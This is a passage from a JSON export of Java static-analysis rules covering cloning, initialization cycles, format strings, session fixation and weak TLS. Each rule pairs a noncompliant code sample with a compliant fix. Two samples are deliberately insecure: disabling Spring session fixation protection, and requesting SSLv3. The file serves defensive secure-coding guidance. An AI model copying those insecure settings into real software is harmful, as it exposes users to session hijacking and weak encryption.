            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1182",
            "repo": "java",
            "name": "Classes that override \"clone\" should be \"Cloneable\" and call \"super.clone()\"",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p><code>Cloneable</code> is the marker <code>Interface</code> that indicates that <code>clone()</code> may be called on an object. Overriding\n<code>clone()</code> without implementing <code>Cloneable</code> can be useful if you want to control how subclasses clone themselves, but otherwise,\nit's probably a mistake.</p>\n<p>The usual convention for <code>Object.clone()</code> according to Oracle's Javadoc is:</p>\n<ol>\n  <li> <code>x.clone() != x</code> </li>\n  <li> <code>x.clone().getClass() == x.getClass()</code> </li>\n  <li> <code>x.clone().equals\\(x\\)</code> </li>\n</ol>\n<p>Obtaining the object that will be returned by calling <code>super.clone()</code> helps to satisfy those invariants:</p>\n<ol>\n  <li> <code>super.clone()</code> returns a new object instance </li>\n  <li> <code>super.clone()</code> returns an object of the same type as the one <code>clone()</code> was called on </li>\n  <li> <code>Object.clone()</code> performs a shallow copy of the object's state </li>\n</ol>\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass BaseClass {  // Noncompliant; should implement Cloneable\n  @Override\n  public Object clone() throws CloneNotSupportedException {    // Noncompliant; should return the super.clone() instance\n    return new BaseClass();\n  }\n}\n\nclass DerivedClass extends BaseClass implements Cloneable {\n  /* Does not override clone() */\n\n  public void sayHello() {\n    System.out.println(\"Hello, world!\");\n  }\n}\n\nclass Application {\n  public static void main(String[] args) throws Exception {\n    DerivedClass instance = new DerivedClass();\n    ((DerivedClass) instance.clone()).sayHello();              // Throws a ClassCastException because invariant #2 is violated\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nclass BaseClass implements Cloneable {\n  @Override\n  public Object clone() throws CloneNotSupportedException {    // Compliant\n    return super.clone();\n  }\n}\n\nclass DerivedClass extends BaseClass implements Cloneable {\n  /* Does not override clone() */\n\n  public void sayHello() {\n    System.out.println(\"Hello, world!\");\n  }\n}\n\nclass Application {\n  public static void main(String[] args) throws Exception {\n    DerivedClass instance = new DerivedClass();\n    ((DerivedClass) instance.clone()).sayHello();              // Displays \"Hello, world!\" as expected. Invariant #2 is satisfied\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/580.html\">MITRE, CWE-580</a> - clone() Method Without super.clone() </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/FjZGBQ\">CERT, MET53-J.</a> - Ensure that the clone() method calls super.clone() </li>\n</ul>",
            "mdDesc": "<p><code>Cloneable</code> is the marker <code>Interface</code> that indicates that <code>clone()</code> may be called on an object. Overriding\n<code>clone()</code> without implementing <code>Cloneable</code> can be useful if you want to control how subclasses clone themselves, but otherwise,\nit's probably a mistake.</p>\n<p>The usual convention for <code>Object.clone()</code> according to Oracle's Javadoc is:</p>\n<ol>\n  <li> <code>x.clone() != x</code> </li>\n  <li> <code>x.clone().getClass() == x.getClass()</code> </li>\n  <li> <code>x.clone().equals\\(x\\)</code> </li>\n</ol>\n<p>Obtaining the object that will be returned by calling <code>super.clone()</code> helps to satisfy those invariants:</p>\n<ol>\n  <li> <code>super.clone()</code> returns a new object instance </li>\n  <li> <code>super.clone()</code> returns an object of the same type as the one <code>clone()</code> was called on </li>\n  <li> <code>Object.clone()</code> performs a shallow copy of the object's state </li>\n</ol>\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass BaseClass {  // Noncompliant; should implement Cloneable\n  @Override\n  public Object clone() throws CloneNotSupportedException {    // Noncompliant; should return the super.clone() instance\n    return new BaseClass();\n  }\n}\n\nclass DerivedClass extends BaseClass implements Cloneable {\n  /* Does not override clone() */\n\n  public void sayHello() {\n    System.out.println(\"Hello, world!\");\n  }\n}\n\nclass Application {\n  public static void main(String[] args) throws Exception {\n    DerivedClass instance = new DerivedClass();\n    ((DerivedClass) instance.clone()).sayHello();              // Throws a ClassCastException because invariant #2 is violated\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nclass BaseClass implements Cloneable {\n  @Override\n  public Object clone() throws CloneNotSupportedException {    // Compliant\n    return super.clone();\n  }\n}\n\nclass DerivedClass extends BaseClass implements Cloneable {\n  /* Does not override clone() */\n\n  public void sayHello() {\n    System.out.println(\"Hello, world!\");\n  }\n}\n\nclass Application {\n  public static void main(String[] args) throws Exception {\n    DerivedClass instance = new DerivedClass();\n    ((DerivedClass) instance.clone()).sayHello();              // Displays \"Hello, world!\" as expected. Invariant #2 is satisfied\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/580.html\">MITRE, CWE-580</a> - clone() Method Without super.clone() </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/FjZGBQ\">CERT, MET53-J.</a> - Ensure that the clone() method calls super.clone() </li>\n</ul>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "convention",
                "cwe"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "20min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "20min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "20min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "20min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2390",
            "repo": "java",
            "name": "Classes should not access their own subclasses during initialization",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>When a parent class references a member of a subclass during its own initialization, the results might not be what you expect because the child\nclass might not have been initialized yet. This could create what is known as an \"initialisation cycle\", or even a deadlock in some extreme cases.</p>\n<p>To make things worse, these issues are very hard to diagnose so it is highly recommended you avoid creating this kind of dependencies.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass Parent {\n  static int field1 = Child.method(); // Noncompliant\n  static int field2 = 42;\n\n  public static void main(String[] args) {\n    System.out.println(Parent.field1); // will display \"0\" instead of \"42\"\n  }\n}\n\nclass Child extends Parent {\n  static int method() {\n    return Parent.field2;\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.securecoding.cert.org/confluence/display/java/DCL00-J.+Prevent+class+initialization+cycles\">CERT, DCL00-J.</a> - Prevent\n  class initialization cycles </li>\n  <li> Java Language Specifications - <a href=\"https://docs.oracle.com/javase/specs/jls/se8/html/jls-12.html#jls-12.4\">Section 12.4: Initialization of\n  Classes and Interfaces</a> </li>\n</ul>",
            "mdDesc": "<p>When a parent class references a member of a subclass during its own initialization, the results might not be what you expect because the child\nclass might not have been initialized yet. This could create what is known as an \"initialisation cycle\", or even a deadlock in some extreme cases.</p>\n<p>To make things worse, these issues are very hard to diagnose so it is highly recommended you avoid creating this kind of dependencies.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass Parent {\n  static int field1 = Child.method(); // Noncompliant\n  static int field2 = 42;\n\n  public static void main(String[] args) {\n    System.out.println(Parent.field1); // will display \"0\" instead of \"42\"\n  }\n}\n\nclass Child extends Parent {\n  static int method() {\n    return Parent.field2;\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.securecoding.cert.org/confluence/display/java/DCL00-J.+Prevent+class+initialization+cycles\">CERT, DCL00-J.</a> - Prevent\n  class initialization cycles </li>\n  <li> Java Language Specifications - <a href=\"https://docs.oracle.com/javase/specs/jls/se8/html/jls-12.html#jls-12.4\">Section 12.4: Initialization of\n  Classes and Interfaces</a> </li>\n</ul>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "20min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "20min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "20min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "20min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S3578",
            "repo": "java",
            "name": "Test methods should comply with a naming convention",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Shared naming conventions allow teams to collaborate efficiently. This rule raises an issue when a test method name does not match the provided\nregular expression.</p>\n<h2>Noncompliant Code Example</h2>\n<p>With the default value: <code>^test[A-Z][a-zA-Z0-9]*$</code></p>\n<pre>\n@Test\npublic void foo() {  // Noncompliant\n  //...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n@Test\npublic void testFoo() {\n  // ...\n}\n</pre>",
            "mdDesc": "<p>Shared naming conventions allow teams to collaborate efficiently. This rule raises an issue when a test method name does not match the provided\nregular expression.</p>\n<h2>Noncompliant Code Example</h2>\n<p>With the default value: <code>^test[A-Z][a-zA-Z0-9]*$</code></p>\n<pre>\n@Test\npublic void foo() {  // Noncompliant\n  //...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n@Test\npublic void testFoo() {\n  // ...\n}\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "convention",
                "tests"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [
                {
                    "key": "format",
                    "htmlDesc": "Regular expression the test method names are checked against.",
                    "defaultValue": "^test[A-Z][a-zA-Z0-9]*$",
                    "type": "STRING"
                }
            ],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S3457",
            "repo": "java",
            "name": "Printf-style format strings should be used correctly",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Because <code>printf</code>-style format strings are interpreted at runtime, rather than validated by the compiler, they can contain errors that\nresult in the wrong strings being created. This rule statically validates the correlation of <code>printf</code>-style format strings to their\narguments when calling the <code>format(...)</code> methods of <code>java.util.Formatter</code>, <code>java.lang.String</code>,\n<code>java.io.PrintStream</code>, <code>MessageFormat</code>, and <code>java.io.PrintWriter</code> classes and the <code>printf(...)</code> methods of\n<code>java.io.PrintStream</code> or <code>java.io.PrintWriter</code> classes. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nString.format(\"First {0} and then {1}\", \"foo\", \"bar\");  //Noncompliant. Looks like there is a confusion with the use of {{java.text.MessageFormat}}, parameters \"foo\" and \"bar\" will be simply ignored here\nString.format(\"Display %3$d and then %d\", 1, 2, 3);   //Noncompliant; the second argument '2' is unused\nString.format(\"Too many arguments %d and %d\", 1, 2, 3);  //Noncompliant; the third argument '3' is unused\nString.format(\"First Line\\n\");   //Noncompliant; %n should be used in place of \\n to produce the platform-specific line separator\nString.format(\"Is myObject null ? %b\", myObject);   //Noncompliant; when a non-boolean argument is formatted with %b, it prints true for any nonnull value, and false for null. Even if intended, this is misleading. It's better to directly inject the boolean value (myObject == null in this case)\nString.format(\"value is \" + value); // Noncompliant\nString s = String.format(\"string without arguments\"); // Noncompliant\n\nMessageFormat.format(\"Result '{0}'.\", value); // Noncompliant; String contains no format specifiers. (quote are discarding format specifiers)\nMessageFormat.format(\"Result {0}.\", value, value);  // Noncompliant; 2nd argument is not used\nMessageFormat.format(\"Result {0}.\", myObject.toString()); // Noncompliant; no need to call toString() on objects\n\njava.util.Logger logger;\nlogger.log(java.util.logging.Level.SEVERE, \"Result {0}.\", myObject.toString()); // Noncompliant; no need to call toString() on objects\nlogger.log(java.util.logging.Level.SEVERE, \"Result.\", new Exception()); // compliant, parameter is an exception\nlogger.log(java.util.logging.Level.SEVERE, \"Result '{0}'\", 14); // Noncompliant - String contains no format specifiers.\nlogger.log(java.util.logging.Level.SEVERE, \"Result \" + param, exception); // Noncompliant; Lambda should be used to differ string concatenation.\n\norg.slf4j.Logger slf4jLog;\norg.slf4j.Marker marker;\n\nslf4jLog.debug(marker, \"message {}\");\nslf4jLog.debug(marker, \"message\", 1); // Noncompliant - String contains no format specifiers.\n\norg.apache.logging.log4j.Logger log4jLog;\nlog4jLog.debug(\"message\", 1); // Noncompliant - String contains no format specifiers.\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nString.format(\"First %s and then %s\", \"foo\", \"bar\");\nString.format(\"Display %2$d and then %d\", 1, 3);\nString.format(\"Too many arguments %d %d\", 1, 2);\nString.format(\"First Line%n\");\nString.format(\"Is myObject null ? %b\", myObject == null);\nString.format(\"value is %d\", value);\nString s = \"string without arguments\";\n\nMessageFormat.format(\"Result {0}.\", value);\nMessageFormat.format(\"Result '{0}'  =  {0}\", value);\nMessageFormat.format(\"Result {0}.\", myObject);\n\njava.util.Logger logger;\nlogger.log(java.util.logging.Level.SEVERE, \"Result {0}.\", myObject);\nlogger.log(java.util.logging.Level.SEVERE, \"Result {0}'\", 14);\nlogger.log(java.util.logging.Level.SEVERE, exception, () -&gt; \"Result \" + param);\n\norg.slf4j.Logger slf4jLog;\norg.slf4j.Marker marker;\n\nslf4jLog.debug(marker, \"message {}\");\nslf4jLog.debug(marker, \"message {}\", 1);\n\norg.apache.logging.log4j.Logger log4jLog;\nlog4jLog.debug(\"message {}\", 1);\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.securecoding.cert.org/confluence/x/wQA1\">CERT, FIO47-C.</a> - Use valid format strings </li>\n</ul>",
            "mdDesc": "<p>Because <code>printf</code>-style format strings are interpreted at runtime, rather than validated by the compiler, they can contain errors that\nresult in the wrong strings being created. This rule statically validates the correlation of <code>printf</code>-style format strings to their\narguments when calling the <code>format(...)</code> methods of <code>java.util.Formatter</code>, <code>java.lang.String</code>,\n<code>java.io.PrintStream</code>, <code>MessageFormat</code>, and <code>java.io.PrintWriter</code> classes and the <code>printf(...)</code> methods of\n<code>java.io.PrintStream</code> or <code>java.io.PrintWriter</code> classes. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nString.format(\"First {0} and then {1}\", \"foo\", \"bar\");  //Noncompliant. Looks like there is a confusion with the use of {{java.text.MessageFormat}}, parameters \"foo\" and \"bar\" will be simply ignored here\nString.format(\"Display %3$d and then %d\", 1, 2, 3);   //Noncompliant; the second argument '2' is unused\nString.format(\"Too many arguments %d and %d\", 1, 2, 3);  //Noncompliant; the third argument '3' is unused\nString.format(\"First Line\\n\");   //Noncompliant; %n should be used in place of \\n to produce the platform-specific line separator\nString.format(\"Is myObject null ? %b\", myObject);   //Noncompliant; when a non-boolean argument is formatted with %b, it prints true for any nonnull value, and false for null. Even if intended, this is misleading. It's better to directly inject the boolean value (myObject == null in this case)\nString.format(\"value is \" + value); // Noncompliant\nString s = String.format(\"string without arguments\"); // Noncompliant\n\nMessageFormat.format(\"Result '{0}'.\", value); // Noncompliant; String contains no format specifiers. (quote are discarding format specifiers)\nMessageFormat.format(\"Result {0}.\", value, value);  // Noncompliant; 2nd argument is not used\nMessageFormat.format(\"Result {0}.\", myObject.toString()); // Noncompliant; no need to call toString() on objects\n\njava.util.Logger logger;\nlogger.log(java.util.logging.Level.SEVERE, \"Result {0}.\", myObject.toString()); // Noncompliant; no need to call toString() on objects\nlogger.log(java.util.logging.Level.SEVERE, \"Result.\", new Exception()); // compliant, parameter is an exception\nlogger.log(java.util.logging.Level.SEVERE, \"Result '{0}'\", 14); // Noncompliant - String contains no format specifiers.\nlogger.log(java.util.logging.Level.SEVERE, \"Result \" + param, exception); // Noncompliant; Lambda should be used to differ string concatenation.\n\norg.slf4j.Logger slf4jLog;\norg.slf4j.Marker marker;\n\nslf4jLog.debug(marker, \"message {}\");\nslf4jLog.debug(marker, \"message\", 1); // Noncompliant - String contains no format specifiers.\n\norg.apache.logging.log4j.Logger log4jLog;\nlog4jLog.debug(\"message\", 1); // Noncompliant - String contains no format specifiers.\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nString.format(\"First %s and then %s\", \"foo\", \"bar\");\nString.format(\"Display %2$d and then %d\", 1, 3);\nString.format(\"Too many arguments %d %d\", 1, 2);\nString.format(\"First Line%n\");\nString.format(\"Is myObject null ? %b\", myObject == null);\nString.format(\"value is %d\", value);\nString s = \"string without arguments\";\n\nMessageFormat.format(\"Result {0}.\", value);\nMessageFormat.format(\"Result '{0}'  =  {0}\", value);\nMessageFormat.format(\"Result {0}.\", myObject);\n\njava.util.Logger logger;\nlogger.log(java.util.logging.Level.SEVERE, \"Result {0}.\", myObject);\nlogger.log(java.util.logging.Level.SEVERE, \"Result {0}'\", 14);\nlogger.log(java.util.logging.Level.SEVERE, exception, () -&gt; \"Result \" + param);\n\norg.slf4j.Logger slf4jLog;\norg.slf4j.Marker marker;\n\nslf4jLog.debug(marker, \"message {}\");\nslf4jLog.debug(marker, \"message {}\", 1);\n\norg.apache.logging.log4j.Logger log4jLog;\nlog4jLog.debug(\"message {}\", 1);\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.securecoding.cert.org/confluence/x/wQA1\">CERT, FIO47-C.</a> - Use valid format strings </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "confusing"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S5876",
            "repo": "java",
            "name": "A new session should be created during user authentication",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Session fixation attacks occur when an attacker can force a legitimate user to use a session ID that he knows. To avoid fixation attacks, it's a\ngood practice to generate a new session each time a user authenticates and delete/invalidate the existing session (the one possibly known by the\nattacker).</p>\n<h2>Noncompliant Code Example</h2>\n<p>In a Spring Security's context, session fixation protection is enabled by default but can be disabled with <code>sessionFixation().none()</code>\nmethod:</p>\n<pre>\n@Override\nprotected void configure(HttpSecurity http) throws Exception {\n   http.sessionManagement()\n     .sessionFixation().none(); // Noncompliant: the existing session will continue\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>In a Spring Security's context, session fixation protection can be enabled as follows:</p>\n<pre>\n@Override\nprotected void configure(HttpSecurity http) throws Exception {\n  http.sessionManagement()\n     .sessionFixation().newSession(); // Compliant: a new session is created without any of the attributes from the old session being copied over\n\n  // or\n\n  http.sessionManagement()\n     .sessionFixation().migrateSession(); // Compliant: a new session is created, the old one is invalidated and the attributes from the old session are copied over.\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A2-Broken_Authentication\">OWASP Top 10 2017 Category A2</a> -\n  Broken Authentication </li>\n  <li> <a href=\"https://www.owasp.org/index.php/Session_fixation\">OWASP Sesssion Fixation</a> </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/384.html\">MITRE, CWE-384</a> - Session Fixation </li>\n</ul>",
            "mdDesc": "<p>Session fixation attacks occur when an attacker can force a legitimate user to use a session ID that he knows. To avoid fixation attacks, it's a\ngood practice to generate a new session each time a user authenticates and delete/invalidate the existing session (the one possibly known by the\nattacker).</p>\n<h2>Noncompliant Code Example</h2>\n<p>In a Spring Security's context, session fixation protection is enabled by default but can be disabled with <code>sessionFixation().none()</code>\nmethod:</p>\n<pre>\n@Override\nprotected void configure(HttpSecurity http) throws Exception {\n   http.sessionManagement()\n     .sessionFixation().none(); // Noncompliant: the existing session will continue\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>In a Spring Security's context, session fixation protection can be enabled as follows:</p>\n<pre>\n@Override\nprotected void configure(HttpSecurity http) throws Exception {\n  http.sessionManagement()\n     .sessionFixation().newSession(); // Compliant: a new session is created without any of the attributes from the old session being copied over\n\n  // or\n\n  http.sessionManagement()\n     .sessionFixation().migrateSession(); // Compliant: a new session is created, the old one is invalidated and the attributes from the old session are copied over.\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A2-Broken_Authentication\">OWASP Top 10 2017 Category A2</a> -\n  Broken Authentication </li>\n  <li> <a href=\"https://www.owasp.org/index.php/Session_fixation\">OWASP Sesssion Fixation</a> </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/384.html\">MITRE, CWE-384</a> - Session Fixation </li>\n</ul>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cwe",
                "owasp-a2",
                "spring"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "VULNERABILITY"
        },
        {
            "key": "java:S4423",
            "repo": "java",
            "name": "Weak SSL/TLS protocols should not be used",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p><code>javax.net.ssl.SSLContext.getInstance</code> returns a SSLContext object that implements the specified secure socket protocol. However, older\nprotocol versions like \"SSLv3\" have been proven to be insecure.</p>\n<p>This rule raises an issue when an <code>SSLContext</code> is created with an insecure protocol version(ie: a protocol different from \"TLS\", \"DTLS\",\n\"TLSv1.2\", \"DTLSv1.2\", \"TLSv1.3\", \"DTLSv1.3\").</p>\n<p>The recommended value is \"TLS\" or \"DTLS\" as it will always use the latest version of the protocol. However an issue will be raised if the bytecode\nwas compiled with JDK7 or an even older version of JDK because they are not alias for TLSv1.2 and DTLSv1.2 but for weaker protocols.</p>\n<p>Note that calling <code>SSLContext.getInstance(...)</code> with \"TLSv1.2\" or \"DTLSv1.2\" doesn't prevent protocol version negotiation. For example,\nif a client connects with \"TLSv1.1\" and the server used <code>SSLContext.getInstance(\"TLSv1.2\")</code>, the connection will use \"TLSv1.1\". It is\npossible to enable only specific protocol versions by calling <code>setEnabledProtocols</code> on <code>SSLSocket</code>, <code>SSLServerSocket</code>\nor <code>SSLEngine</code>. However this should be rarely needed as clients usually ask for the most secure protocol supported.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\ncontext = SSLContext.getInstance(\"SSLv3\"); // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\ncontext = SSLContext.getInstance(\"TLSv1.2\");\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure\n  </li>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration\">OWASP Top 10 2017 Category A6</a> - Security\n  Misconfiguration </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/326.html\">MITRE, CWE-327</a> - Inadequate Encryption Strength </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/327.html\">MITRE, CWE-326</a> - Use of a Broken or Risky Cryptographic Algorithm </li>\n  <li> <a href=\"https://www.sans.org/top25-software-errors/#cat3\">SANS Top 25</a> - Porous Defenses </li>\n  <li> <a href=\"https://blogs.oracle.com/java-platform-group/diagnosing-tls,-ssl,-and-https\">Diagnosing TLS, SSL, and HTTPS</a> </li>\n  <li> <a href=\"https://github.com/ssllabs/research/wiki/SSL-and-TLS-Deployment-Best-Practices#22-use-secure-protocols\">SSL and TLS Deployment Best\n  Practices - Use secure protocols</a> </li>\n</ul>",
            "mdDesc": "<p><code>javax.net.ssl.SSLContext.getInstance</code> returns a SSLContext object that implements the specified secure socket protocol. However, older\nprotocol versions like \"SSLv3\" have been proven to be insecure.</p>\n<p>This rule raises an issue when an <code>SSLContext</code> is created with an insecure protocol version(ie: a protocol different from \"TLS\", \"DTLS\",\n\"TLSv1.2\", \"DTLSv1.2\", \"TLSv1.3\", \"DTLSv1.3\").</p>\n<p>The recommended value is \"TLS\" or \"DTLS\" as it will always use the latest version of the protocol. However an issue will be raised if the bytecode\nwas compiled with JDK7 or an even older version of JDK because they are not alias for TLSv1.2 and DTLSv1.2 but for weaker protocols.</p>\n<p>Note that calling <code>SSLContext.getInstance(...)</code> with \"TLSv1.2\" or \"DTLSv1.2\" doesn't prevent protocol version negotiation. For example,\nif a client connects with \"TLSv1.1\" and the server used <code>SSLContext.getInstance(\"TLSv1.2\")</code>, the connection will use \"TLSv1.1\". It is\npossible to enable only specific protocol versions by calling <code>setEnabledProtocols</code> on <code>SSLSocket</code>, <code>SSLServerSocket</code>\nor <code>SSLEngine</code>. However this should be rarely needed as clients usually ask for the most secure protocol supported.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\ncontext = SSLContext.getInstance(\"SSLv3\"); // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\ncontext = SSLContext.getInstance(\"TLSv1.2\");\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure\n  </li>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration\">OWASP Top 10 2017 Category A6</a> - Security\n  Misconfiguration </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/326.html\">MITRE, CWE-327</a> - Inadequate Encryption Strength </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/327.html\">MITRE, CWE-326</a> - Use of a Broken or Risky Cryptographic Algorithm </li>\n  <li> <a href=\"https://www.sans.org/top25-software-errors/#cat3\">SANS Top 25</a> - Porous Defenses </li>\n  <li> <a href=\"https://blogs.oracle.com/java-platform-group/diagnosing-tls,-ssl,-and-https\">Diagnosing TLS, SSL, and HTTPS</a> </li>\n  <li> <a href=\"https://github.com/ssllabs/research/wiki/SSL-and-TLS-Deployment-Best-Practices#22-use-secure-protocols\">SSL and TLS Deployment Best\n  Practices - Use secure protocols</a> </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cwe",
                "owasp-a3",
                "owasp-a6",
                "privacy",
                "sans-top25-porous"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "VULNERABILITY"
        },
        {
            "key": "java:S4787",
            "repo": "java",
            "name": "Encrypting data is security-sensitive",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Encrypting data is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7902\">CVE-2017-7902</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-1378\">CVE-2006-1378</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1376\">CVE-2003-1376</a> </li>\n</ul>\n<p>Proper encryption requires both the encryption algorithm and the key to be strong. Obviously the private key needs to remain secret and be renewed\nregularly. However these are not the only means to defeat or weaken an encryption.</p>\n<p> </p>\n<p>This rule flags function calls that initiate encryption/decryption.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the private key might not be random, strong enough or the same key is reused for a long long time. </li>\n  <li> the private key might be compromised. It can happen when it is stored in an unsafe place or when it was transferred in an unsafe manner. </li>\n  <li> the key exchange is made without properly authenticating the receiver. </li>\n  <li> the encryption algorithm is not strong enough for the level of protection required. Note that encryption algorithms strength decreases as time\n  passes. </li>\n  <li> the chosen encryption library is deemed unsafe. </li>\n  <li> a nonce is used, and the same value is reused multiple times, or the nonce is not random. </li>\n  <li> the RSA algorithm is used, and it does not incorporate an Optimal Asymmetric Encryption Padding (OAEP), which might weaken the encryption.\n  </li>\n  <li> the CBC (Cypher Block Chaining) algorithm is used for encryption, and it's IV (Initialization Vector) is not generated using a secure random\n  algorithm, or it is reused. </li>\n  <li> the Advanced Encryption Standard (AES) encryption algorithm is used 